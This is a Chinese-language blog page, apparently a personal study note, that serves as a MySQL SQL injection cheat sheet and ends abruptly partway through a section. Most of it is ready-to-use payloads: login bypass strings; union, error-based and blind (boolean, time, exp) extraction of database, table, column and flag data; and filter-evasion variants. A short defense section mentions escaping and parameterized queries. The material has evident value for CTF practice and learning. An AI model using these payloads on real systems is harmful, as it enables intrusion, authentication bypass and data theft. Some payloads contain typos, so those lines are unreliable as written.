@@ -1,0 +1,1303 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="白尾青芳の小窝">
+  <title>SQL injection SQL注入 基于MySQL数据库 | 白尾青芳の小窝</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;600;700&family=Space+Grotesk:wght@500;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/css/styles.css?v=20260722-2148">
+<meta name="generator" content="Hexo 8.1.1"></head>
+<body>
+  <video class="backdrop" autoplay muted loop playsinline preload="auto" aria-hidden="true">
+    <source src="/images/wallpaper.mp4" type="video/mp4">
+  </video>
+
+  <button class="mobile-menu" id="menuToggle" type="button" aria-label="打开导航" aria-expanded="false">
+    <span></span><span></span><span></span>
+  </button>
+
+  <aside class="sidebar" id="sidebar">
+    <div class="profile">
+      <img class="avatar" src="/images/fox-avatar.jpg" alt="白尾青芳头像">
+      <p class="eyebrow">SECURITY · CODE · NOTES</p>
+      <h1>白尾青芳</h1>
+      <p class="motto">在每一次请求与响应之间，找到系统真实的边界。</p>
+    </div>
+
+    <nav class="main-nav" aria-label="主导航">
+      <a class="" href="/"><i data-lucide="home"></i><span>博客首页</span></a>
+      <a class="" href="/study/"><i data-lucide="book-open"></i><span>学习导航</span></a>
+      <a href="/categories/Web-%E5%AE%89%E5%85%A8/"><i data-lucide="shield-check"></i><span>Web 安全</span></a>
+      <a href="/categories/%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/"><i data-lucide="code-2"></i><span>开发笔记</span></a>
+      <a class="" href="/archives/"><i data-lucide="archive"></i><span>文章归档</span></a>
+      <a href="/about/"><i data-lucide="user-round"></i><span>关于我</span></a>
+    </nav>
+
+    <div class="sidebar-footer">
+      <div class="social-links">
+        <a target="_blank" rel="noopener" href="https://github.com/baiweiqingfang" aria-label="GitHub" title="GitHub"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M12 .5C5.65.5.5 5.65.5 12c0 5.1 3.29 9.43 7.86 10.96.58.1.79-.25.79-.56v-2.14c-3.2.7-3.87-1.36-3.87-1.36-.52-1.34-1.28-1.7-1.28-1.7-1.05-.72.08-.7.08-.7 1.16.08 1.77 1.2 1.77 1.2 1.03 1.76 2.7 1.25 3.36.96.1-.75.4-1.25.73-1.54-2.55-.29-5.24-1.28-5.24-5.68 0-1.25.45-2.28 1.19-3.08-.12-.29-.52-1.46.11-3.04 0 0 .97-.31 3.17 1.18.92-.26 1.9-.38 2.88-.39.98 0 1.96.13 2.88.39 2.2-1.49 3.16-1.18 3.16-1.18.63 1.58.23 2.75.11 3.04.74.8 1.19 1.83 1.19 3.08 0 4.42-2.69 5.39-5.25 5.67.41.36.78 1.06.78 2.14v3.17c0 .31.21.67.8.56A11.5 11.5 0 0 0 23.5 12C23.5 5.65 18.35.5 12 .5Z"/></svg></a>
+        <a href="/atom.xml" aria-label="RSS" title="RSS"><i data-lucide="rss"></i></a>
+      </div>
+      <p>© 2026 白尾青芳 · Powered by Hexo</p>
+    </div>
+  </aside>
+
+  <main class="content">
+    <article class="article-page">
+  <header class="article-header">
+    <p class="eyebrow">learning</p>
+    <h1>SQL injection SQL注入 基于MySQL数据库</h1>
+    <div class="post-meta">
+      <time datetime="2026-06-29T05:14:12.000Z">2026.06.29</time>
+      <span>25 分钟阅读</span>
+    </div>
+  </header>
+  <div class="article-content">
+    
+# SQL injection SQL注入 基于MySQL数据库
+
+注入原理：通过用户可控参数注入SQL语法，破坏原有SQL结构。
+
+产生原因：
+
+1.程序员在处理程序和数据库交互时，使用字符串拼接的方式构造SQL语句
+
+2.未对用户可控参数进行足够的过滤，便将参数内容拼接到SQL语句中
+
+常见用户可控参数：
+
+id
+
+username
+
+password
+
+keyword
+
+sort
+
+page
+
+## 判断MySQL数据库的方式
+
+1.3306端口号
+
+2.使用#，-- +注释符
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span># </span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+3.拼接字符串方式：
+
+使用空格直接拼接字符串
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> <span class="string">&#x27;a&#x27;</span> <span class="string">&#x27;b&#x27;</span> <span class="operator">=</span> <span class="string">&#x27;ab&#x27;</span></span><br></pre></td></tr></table></figure>
+
+使用 CONCAT() 函数
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> CONCAT(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>) <span class="operator">=</span> <span class="string">&#x27;ab&#x27;</span></span><br></pre></td></tr></table></figure>
+
+- 如果空格或 CONCAT成功而 + 或 || 报错
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;a&#x27;</span><span class="operator">+</span><span class="string">&#x27;b&#x27;</span><span class="operator">=</span><span class="string">&#x27;ab&#x27;</span></span><br><span class="line"><span class="string">&#x27;a&#x27;</span><span class="operator">||</span><span class="string">&#x27;b&#x27;</span><span class="operator">=</span><span class="string">&#x27;ab&#x27;</span></span><br></pre></td></tr></table></figure>
+
+4.使用sleep()函数
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> sleep(<span class="number">5</span>)</span><br></pre></td></tr></table></figure>
+
+5.Union 注入时，使用UNION SELECT控制回显位置，直接去查 MySQL 标志性的系统表
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>, schema_name, <span class="number">3</span> <span class="keyword">FROM</span> information_schema.schemata LIMIT <span class="number">0</span>,<span class="number">1</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+6.利用MySQL 特有的全局变量和内置函数
+
+全局变量：@@version
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> @<span class="variable">@version</span><span class="operator">&gt;</span><span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+MySQL的返回值通常直接以版本号数字开头
+
+内置函数：
+
+version() 
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> <span class="keyword">LEFT</span>(version(), <span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;5&#x27;</span></span><br></pre></td></tr></table></figure>
+
+MySQL的返回值为纯数字
+
+connection_id()
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> connection_id()<span class="operator">&gt;</span><span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+## 1.万能账号密码
+
+数字型万能账号：
+
+\<a> or \<true> #  
+
+\<a> or \<true> -- a
+
+单引号字符型万能账号：
+
+\<a>' or \<true> #
+
+\<a>' or \<true> -- a
+
+双引号字符型万能账号:
+
+\<a>" or \<true> #
+
+\<a>" or \<true> -- a
+
+数字型万能密码：
+
+admin #
+
+admin -- a
+
+单引号字符型万能密码：
+
+admin' #
+
+admin' -- a
+
+双引号字符型万能密码：
+
+admin" #
+
+admin" -- a
+
+## 2.基本类型
+
+### 2.1数字型
+
+url地址中输入www.xxxx.com/ccc.php?id=x and 1=1
+页面显示正常，继续下一步
+
+SQL语句类似于：
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span>x <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>；</span><br></pre></td></tr></table></figure>
+
+url地址中输入www.xxxx.com/ccc.php?id=x and 1=2
+页面错误，这说明存在数字型注入
+
+SQL语句类似于：
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span>x <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span>;</span><br></pre></td></tr></table></figure>
+
+### 2.2字符型
+
+url地址中输入www.xxx.com/ccc.php?id=1’ and ‘1’='1
+页面正常，继续下一步
+
+SQL语句类似于：
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span></span><br></pre></td></tr></table></figure>
+
+url地址中输入www.xxx.com/ccc.php?id=1’ and ‘1’='2
+页面报错，则说明存在字符型注入
+
+SQL语句类似于：
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;2&#x27;</span></span><br></pre></td></tr></table></figure>
+
+## 3.基本手法
+
+在使用#时，需要进行URL编码
+
+### 3.1Union联合查询
+
+Order by 根据一个不存在的列排序，会报错，可以用来获取列的数量，为union联合查询做准备
+
+适用于数据库中内容会回显到页面中的情况。利用union select语句，执行两条select语句，实现跨库，跨表查询
+
+必要条件：
+
+两条select语句查询结果具有相同的列数；
+
+对应的列数据类型相同
+
+#### 3.1.1基本流程
+
+![image-20260316231952313](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260316231952313.png)
+
+#### 3.1.2利用条件
+
+页面可以把数据回显
+
+Union关键字没有没过滤
+
+select 1，2，3...合法
+
+#### 3.1.3 payload
+
+查找注入点：
+
+id = 1 and 1 = 1%23
+
+测试列数：
+
+id = 1 order by 3%23
+
+使用二分法猜列数
+
+测试回显位：
+
+id = -1 union select 1,2,3%23
+
+那数据库名：
+
+id=-1 union select 1,schema_name,3 from information_schema.schemata%23
+
+或
+
+id=-1 union select 1,database(),3%23
+
+拿表名：
+
+id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23
+
+拿列名：
+
+id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='flag'%23
+
+拿数据：
+
+id=-1 union select 1,group_concat(flag),3 from flag%23
+
+### 3.2报错注入
+
+当计算机接收到非预期的输入时，就会报错，可以利用数据库机制，人为构造错误，让数据库把敏感信息爆出
+
+优点：
+
+当union联合查询被过滤时可以使用
+
+对列没有要求
+
+缺点：
+
+大多数情况下都会屏蔽报错信息
+
+#### 3.1.1基本流程
+
+找到注入点 ==> 判断是字符型还是数字型 ==> 拿数据库名 ==> 拿表名 ==> 拿列名 ==> 拿数据
+
+#### 3.2.2Extractvalue报错注入
+
+payload：
+
+id=1 and (extractvalue(1, concat(0x5c, (select user()))))%23
+
+第一个参数随便写
+
+第二个参数，concat连接字符串
+
+0x5c不是extractvalue的合法字符就会报错，并返回报错结果，报错长度不超过32个字符
+
+爆库名
+
+id=2 and (extractvalue(0x3a, concat(1, (select database()))))%23
+
+爆表名
+
+id=2 and (extractvalue(0x3a, concat(1, (select group_concat(table_name) from information_schema.tables where table_schema=database()))))%23
+
+爆列名
+
+id=2 and (extractvalue(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name='flag'))))%23
+
+爆数据，拿flag
+
+id=2 and (extractvalue(0x3a, concat(1, (select flag from flag))))%23
+
+id=2 and (extractvalue(0x3a, concat(1, (select substr(flag, 30) from flag))))%23
+
+#### 3.2.3Updatexml报错注入
+
+Payload：
+
+id = 1 and (updatexml(0x3a, concat(1, (select user())), 1)%23
+
+第一个参数随便写
+
+第二个参数，concat连接的非xpath格式字符串
+
+第三个参数随便写
+
+0x5c不是extractvalue的合法字符就会报错，并返回报错结果，报错长度不超过32个字符
+
+爆库名
+
+id = 2 and (updatexml(0x3a, concat(1, (select database()), 1)))%23
+
+爆表名
+
+id = 2 and (updatexml(0x3a, concat(1, (select group_concat(table_name) from information_schema.tables where table_schema=database())), 1))%23
+
+爆列名
+
+id = 2 and (updatexml(0x3a, concat(1, (select group_concat(column_name) from information_schema.columns where table_name='flag')), 1))%23 
+
+爆数据，拿flag
+
+id = 2 and (updatexml(0x3a, concat(1, (select flag from flag))1,))%23
+
+id = 2 and (updatexml(0x3a, concat(1, (select substr(flag, 30) from flag)), 1))%23
+
+#### 3.2.4Floor报错注入
+
+使用版本(8.x>x>5.0)5.0-8.x
+
+主键重复报错：
+
+select username，count（*）from user group by username
+
+Group by分组查询会产生一个虚拟表，其中username是主键，不可重复
+
+![image-20260317190958579](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260317190958579.png)
+
+每次查询一条数据，就去虚拟表中查看数据是否存在，如果不存在就向表中添加，如果存在，则count（*）加1
+
+第一次查询
+
+![image-20260317191142191](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260317191142191.png)
+
+第二次查询
+
+![image-20260317191221983](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260317191221983.png)
+
+第三次查询
+
+![image-20260317191159967](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260317191159967.png)
+
+Rand函数在规定了种子之后，产生的序列是固定的
+
+Rand产生固定序列
+
+select floor (rand(0)*2) from information_schema.tables
+
+查询语句
+
+select username,count(\*) from user group by floor(rand(0)*2)
+
+第一次查询,floor函数值为0,虚拟表中没有0的记录,要将floor函数值进行插入所以floor函数会再运行一次,产生一个1,这个1就会被添加到虚拟表中
+
+第二次查询,floor(rand(0)\*2)返回1,虚拟表中存在1的记录,所以floor函数不会在运行一次,而是直接在count(*)这里+1
+
+第三次查询 floor函数第四次执行,返回0,虚拟表中没有0的记录,要将floor函数值进行插入,所以floor函数会再运行一次,并且把1当作主键插入虚拟表
+中,这时就会产生主键重复报错
+
+payload：
+
+拿数据库名：
+
+id=1 and (select 1 from (select count(\*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)%23
+
+拿表名.
+
+id=1 and (select 1 from (select count(\*),concat((select table_name from information_schema.tables where
+table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23
+
+拿列名
+
+id=1 and (select 1 from (select count(\*),concat((select column_name from information_schema.columns where table_name='flag'
+limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23
+
+拿数据
+
+id=1 and (select 1 from (select count(\*),concat((select flag from flag limit 0,1),floor(rand(0)*2))x from information_schema.tables
+group by x)a)%23
+
+### 3.3盲注
+
+页面没有回显
+
+盲注分为布尔盲注和延时盲注
+
+#### 3.3.1布尔盲注
+
+使用条件：
+
+有两种返回情况，用来判断对错
+
+利用：人为的构造一个判断条件，当条件判断正确的时候，返回hello user；当条件判断错误时，什么都没有，就可以根据输入逐步判断出数据库中的数据
+
+猜长度：
+
+id=1 and length(database()) = 1%23
+
+database()函数返回数据库名,length函数返回数据库名的长度,跟后面的1进行比较,如果相等,那么就返回true;如果不相等,
+返回flase。之后进行一次and运算,前后两个参数都为true时,返回true,页面就会输出，如果length函数这里判断不相等,那么就会
+返回flase,经过and运算,肯定也是返回flase,页面就不会回显数据
+
+猜数据：
+
+id=1 and if(ascii(substr((select database()),1,1))=119,1,0)%23
+
+119为我们猜测的值,可以从0-255挨个试
+substr()截取数据库名的第一位,asci函数返回数据库第一位的ASCII值,紧接着该ASCII值和119进行比较,如果相等,if函数返回1,如果不
+相等if函数返回0
+
+payload：
+
+猜库名长度
+
+id=1 and if(length(database())=<font color = "red">3</font>%23
+
+猜库名
+
+id=1 and if((ascii(substr((select database()),<font color = "red">3</font>,1))=<font color = "red">118</font>),1,0)%23
+
+猜表名长度
+
+id=1 and if((select length(group_concat(table_name)) from information_schema.tables where table_schema=database())=<font color = "red">3</font>,1,0)%23
+
+猜表名
+
+id=1 and if((ascii(substr((select group_concat(table_name) from information_schema.tables where
+table_schema=database()),<font color = "red">3</font>,1))=<font color = "red">118</font>),1,0)%23
+
+猜列名长度
+
+id=1 and if((select length(group_concat(column_name)) from information_schema.columns where table_name='flag')=<font color = "red">3</font>,1,0)%23
+
+
+猜列名
+
+id=1 and if((ascii(substr((select group_concat(column_name) from information_schema.columns where
+table_name='flag'),<font color = "red">3</font>,1))=<font color = "red">3</font>),1,0)23
+
+猜数据长度
+
+
+id=1 and if(((select length(flag) from flag)=<font color = "red">38</font>),1,0)23
+
+猜数据
+
+id=1 and if((ascii(substr((select flag from flag),<font color = "red">3</font>,1))=<font color = "red">102</font>),1,0)%23
+
+#### 3.3.2延时注入
+
+使用条件：
+
+只有一种返回情况
+
+根据服务端的响应时间，来猜测数据
+
+缺点：
+
+效率低，因为需要使用延时函数
+
+##### 3.3.2.1第一种形式
+
+payload:
+
+猜库名长度
+
+id=1 and if((length(database())=3),sleep(5),0)%23
+
+猜库名
+
+id=1 and if((ascii(substr((select database()),3,1))=118),sleep(5),0)%23
+
+猜表名长度
+
+id=1 and if((select length(group_concat(table_name)) from information_schema.tables where table_schema=database())=3,sleep(5),0)23
+
+猜表名
+
+id=1 and if((ascii(substr((select group_concat(table_name) from information_schema.tables where
+table_schema=database()),3,1))=118),sleep(5),0)%23
+
+猜列名长度
+
+id=1 and if((select length(group_concat(column_name)) from information_schema.columns where table_name='flag')=3,sleep(5),0)%23
+
+
+猜列名
+
+id=1 and if((ascii(substr((select group_concat(column_name) from information_schema.columns where
+table_name='flag'),3,1))=3),sleep(5),0)23
+
+猜数据长度
+
+
+id=1 and if(((select length(flag) from flag)=38),sleep(5),0)23
+
+猜数据
+
+id=1 and if((ascii(substr((select flag from flag),3,1))=102),sleep(5),0)%23
+
+##### 3.3.2.2第二种形式
+
+and短路特性：
+
+and运算只有当前后两个表达式都为true时，才会返回true，程序是从前往后执行的，当前面的表达式返回false时，and运算就不会继续向后运算了
+
+payload：
+
+id = 1 and ascii(substr((select database()),1,1))=119 and sleep(5)
+
+当ascii(substr((select database(),1,1))=119猜测正确时,返回true,然后and运算会继续向后运行,执行sleep(5)
+
+当ascii(substr((select database()),1,1))=118猜测错误时,返回flase,然后and运算就不会向后运行了,也就不会去执行sleep(5)了
+
+猜库名长度
+
+id=1 and length(database())=3 and sleep(5)%23
+
+猜库名 
+
+id=1 and ascii(substr((select database()),3,1))=118 and sleep(5)%23
+
+猜表名长度
+
+id=1 and (select length(group_concat(table_name)) from information_schema.tables where table_schema=database())=3 and sleep(5)%23
+
+猜表名 
+
+id=1 and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),3,1))=118 and sleep(5)%23
+
+猜列名长度
+
+id=1 and (select length(group_concat(column_name)) from information_schema.columns where table_name='flag')=3 and sleep(5)%23
+
+猜列名 
+
+id=1 and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='flag'),3,1))=3 and sleep(5)%23
+
+猜数据长度
+
+id=1 and (select length(flag) from flag)=38 and sleep(5)%23
+
+猜数据 
+
+id=1 and ascii(substr((select flag from flag),3,1))=102 and sleep(5)%23
+
+优点：当if被过滤时，一样可以使用
+
+#### 3.3.3exp报错盲注
+
+Exp的参数在大于709时报错
+
+##### 3.3.3.1Exp报错盲注的使用情况
+
+1.页面有两种回显
+
+因为需要根据报错和不报错猜测数据，报错和不报错是两种情况，所以需要两种回显
+
+优点：
+
+1.不需要使用sleep，update这些报错函数
+
+2.效率比延时盲注高
+
+payday：
+
+id = 1 and exp(709 + C - ascii(substr((select database(), 1, 1)))
+
+709 + C - ASCII值：
+
+709是exp函数可以接受的最大值，超过709就会报错
+
+Select database():
+
+查询数据库名
+
+Substr():
+
+截取指定位
+
+Ascii():
+
+获取字符串的ASCII值
+
+原理：
+
+C从大到小，逐个测试
+
+两种情况：
+
+当C>要猜的值，报错
+
+当C<=要猜的值，返回正常
+
+burp suite中会将+当成空格处理，因此使用URL编码
+
+猜测数据库名的长度
+
+id=1 and exp(709%2b4-length(database()))%23
+
+猜测数据库名
+
+id=1 and exp(709%2b119-ascii(substr((select database()),1,1)))%23
+
+猜表名的长度
+
+id=1 and exp(709%2b9-(select length(group_concat(table_name)) from information_schema.tables where
+table_schema=database()))%23
+
+猜表名
+
+id=1 and exp(709%2b103-ascii(substr((select group_concat(table_name) from information_schema.tables where
+table_schema=database()),1,1)))%23
+
+猜列名长度
+
+id=1 and exp(709%2b4-(select length(group_concat(column_name)) from information_schema.columns where table_name='flag'))%23
+
+猜列名
+
+id=1 and exp(709%2b102-ascii(substr((select group_concat(column_name) from information_schema.columns where
+table_name='flag'),1,1)))%23
+
+猜数据长度
+
+id=1 and exp(709%2b38-(select length(flag) from flag))%23
+
+猜数据
+
+id=1 and exp(709%2b102-ascii(substr((select flag from flag),1,1)))%23
+
+#### 3.3.4使用脚本或burp suite进行爆破
+
+### 3.4已知当前表字段名注入
+
+登录就能拿到flag，username能绕过，password表名已知，但数据需要爆破
+
+#### 3.4.1通配符注入
+
+测试注入
+
+username=admin&password=admin 
+
+提示username or password error
+
+输入单引号测试
+
+username=admin'&password=admin
+
+闭合
+
+username=admin'and 1=1%23&password=admin 提示 password error
+
+推测应该会有password列
+
+username=admin 'and password like'i% '%23&password=1 返回passsword错误,所以password是以i开头
+
+当返回结果全是password error时,就证明数据已经全部都猜出来了
+
+#### 3.4.2正则表达式注入
+
+正则表达式要配合regexp语句使用
+
+只需要把like改成regexp 加上^ 去掉%
+
+username=admin' and password regexp '^ichunqi'%23&password=1
+
+注意:
+因为数据库是不区分大小写的,所以在猜测数据的时间,会有两个返回正确的情况,一般情况下,密码都是会经过一步md5的,然后通过注入拿到一个md5值,md5值也是不区分大小写的,直接去找一个解码md5的网址,就能够拿到最终的密码。
+
+#### 3.4.3Strcmp函数注入
+
+username=admin' and strcmp(ascii(substr(password,1,1)), 1)%23&password=1
+
+Payload分析:
+
+先利用substr截取指定位,再利用ascii函数拿到ASCII值,再通过strcmp函数比较
+
+如果猜测的值不正确,strcmp函数会返回-1或者1
+
+Select 1 and -1;
+
+Select 1 and 1;
+
+猜测的值正确,strcmp函数会返回0
+
+Select 1 and 0;
+
+所以当猜测正确时,服务端返回的是错误的结果,而猜测错误时,返回的是正确的结果
+
+利用Burp的intruder模块逐位爆破
+
+因为使用的是ascii值,
+就避免了大小写的问题,相对于通配符,结果更准确
+
+### 3.5堆叠查询
+
+## 4.危害
+
+窃取用户数据
+
+如果有文件操作权限，也可以造成getshell
+
+## 5.SQL防御
+
+### 5.1数字型注入防御
+
+使用intval函数把用户输入强制转换成整数
+
+### 5.2字符型注入防御
+
+过滤或转义引号
+
+addslashes()函数转义用户输入
+
+str_replace()函数替换用户输入 
+
+### 5.3参数化查询
+
+它通过将用户输入的值作为参数传递给查询语句，而不是将其直接拼接到SQL语句中，从而避免了恶意代码的注入。
+
+SELECT * FROM users WHERE username = @username;
+
+## 6.MySQL特性注入
+
+### 6.1列名重复
+
+select (select * from(select(name_const(version(),1)),name_const(version(),1))a)
+
+限制：只能拿到数据库版本
+
+### 6.2几何函数
+
+Payload：
+
+id =1 and exp(~(select * from(select user())a));
+
+id = 1 and multilinestring((select * from(select * from(select user())a)b));
+
+id = 1 and linestring((select * from(select * from(select user())a)b));
+
+id =1 and multipolygon((select * from(select * from(select user())a)b));
+
+版本限制：
+
+MySQL<5.5.47
+
+## 7.绕过方式
+
+判断关键字是否被过滤：
+
+1.挨个试 , 把每个关键字都输入一遍,但访问失败和关键字被过滤的返回结果是一样的,就无法判断关键字是否被过滤
+
+2.异或注入：
+
+Id=1 ^ (length( 'union' )=5)
+
+当union被过滤时:id=1^(length(' ')=5) 空字符串的长度肯定不为5,所以=这里的判断不会成立,返回0,
+1^0返回1,这种情况下是有输出的,
+
+当union没有被过滤时,id=1‘^(length('union')=5)%23 union的长度为5，所以=这里的判断就会成立,返回1，1^1返回0，这种情况是没有输出的,
+
+### 7.1空格绕过
+
+当数据库对空格字符进行过滤时，可以使用以下方式绕过
+
+#### 7.1.1换行符绕过
+
+常用的换行符:
+%0a %0b %0c %0d
+
+猜列数
+
+id=1%0aorder%0aby%0a3%23
+
+猜回显位
+
+id =- 1%0aunion%Oaselect%0a1,2,3%23
+
+拿数据库名
+
+id =- 1%0aunion%Oaselect%0a1,database(),3%23
+
+拿表名
+
+id =-
+1%0aunion%0aselect%0a1,group_concat(table_name),3%0afrom%0ainformation_schema.tables%0awhere%Oatable_schema=databa
+se()%23
+
+拿列名
+
+id =-
+1%0aunion%0aselect%0a1,group_concat(column_name),3%0afrom%0ainformation_schema.columns%0awhere%Oatable_name='flag
+' %23
+
+拿数据
+
+id =- 1%0aunion%Oaselect%0a1,flag,3%0afrom%0aflag%23
+
+#### 7.1.2注释符绕过
+
+多行注释  / ** /
+
+多行注释可以起到一个替代空格的作用
+
+payload：
+
+拿库名
+
+id =- 1/ ** /union/ ** /select/ ** /1,database(),3%23
+
+拿表名
+
+id =-
+1/ ** /union/ ** /select/ ** /1,group_concat(table_name),3/ ** /from/ ** /information_schema.tables/ ** /where/ ** /table_schema=database()
+%23
+
+拿列名
+
+id =-
+1/ ** /union/ ** /select/ ** /1,group_concat(column_name),3/ ** /from/ ** /information_schema.columns/ ** /where/ ** /table_name='flag'%2
+
+3
+
+拿数据
+
+id =- 1/ ** /union/ ** /select/ ** /1,flag,3/ ** /from/ ** /flag%23
+
+#### 7.1.3括号绕过
+
+在MySQL中,括号是用来包围子查询的,任何可以计算出结果的语句,都可以用括号包裹
+
+select(1)
+
+猜库名
+
+id=(1)and(if((ascii(substr((database()),1,1))=119),1,0))%23
+
+猜表名
+
+id=(1)and(if((ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='web')),1,1))=1
+0),1,0))%23
+
+猜列名
+
+id=(1)and(if((ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')),1,1))
+=102),1,0))%23
+
+猜数据
+
+id=(1)and(if((ascii(substr((select(flag)from(flag)),1,1))=102),1,0))%23
+
+### 7.2逗号绕过
+
+Sql注入中需要使用逗号的三个地方
+
+函数中的逗号
+
+Substr(database(),1,1)
+
+限制记录
+
+Limit 1,2
+
+分隔列名
+
+Union Select 1,2,3
+
+#### 7.2.1From for绕过
+
+From for 
+
+主要是用在函数内,用来截取第几个字符
+
+用法:
+
+From x for y 
+
+从第x个开始读取,读取y的长度
+
+获取数据库名
+
+id=1 and (ascii(substr((select database())from(1)for(1)))=119)%23
+
+获取表名
+
+id=1 and ascii(substr((select group_concat(table_name) from information_schema.tables where
+table_schema=database())from(1)for(1)))=102%23
+
+获取列名
+
+id=1 and ascii(substr((select group_concat(column_name) from information_schema.columns where
+table_name='flag')from(2)for(1)))=108%23
+
+获取数据
+
+id=1 and ascii(substr((select flag from flag)from(1)for(1)))=102%23
+
+#### 7.2.2Limit offset绕过
+
+三种绕过提取数据限制的方法,
+
+第一种
+group_concat
+
+可以用来把多条数据合到一起,使用逗号分隔开
+
+select group_concat(username) from user;
+
+第二种
+Limit 0,1 
+
+提取指定行的数据
+
+select * from user limit 0,1;
+
+前两种都被过滤时：
+
+Limit offset
+
+格式
+
+limit row_count offset offset
+
+row_count 
+
+确定返回的行数
+
+offset
+
+偏移量,就是从第几行开始返回
+
+测试注入点
+
+id=1 and 1=1%23
+
+测试列数
+
+id=1 order by 1%23
+
+爆库名
+
+id=1 union select database()%23
+
+爆表名
+
+id =- 1 union select table name from information_schema.tables where table_schema=database() limit 1 offset 1%23
+
+爆列名
+
+id =- 1 union select column_name from information_schema.columns where table_name='zflag' %23
+爆数据
+id =- 1 union select flag from zflag%23
+
+#### 7.2.3Join绕过
+
+在sql注入中的作用：
+
+Union联合查询的payload
+
+Select * from user where id=1 union select 1,2,3;
+
+使用join的payload
+
+select * from user where id=1 union select * from ((select 1)a JOIN (select 2)b JOIN (select 3)c);.
+
+猜库名
+
+username=admi' union select * from ((select 1)A join (select database())B join (select 3)C)%23&password=s
+
+猜表名
+
+username=admi' union select * from ((select 1)A join (select group_concat(table_name) from
+information_schema.tables where table_schema=database())B join (select 3)C)%23&password=s
+
+猜列名
+
+username=admi' union select * from ((select 1)A join (select group_concat(column_name) from
+information_schema.columns where table_name='flag')B join (select 3)C)%23&password=s
+
+猜数据
+
+username=admi' union select * from ((select 1)A join (select flag from flag)B join (select
+3)C)%23&password=s
+
+### 7.3等号绕过
+
+=主要用在盲注中，用来判断数据大小是否相等
+
+#### 7.3.1大小于号绕过
+
+大小于号可以用来比较数据的大小
+
+<>相当于等于
+
+猜库名
+
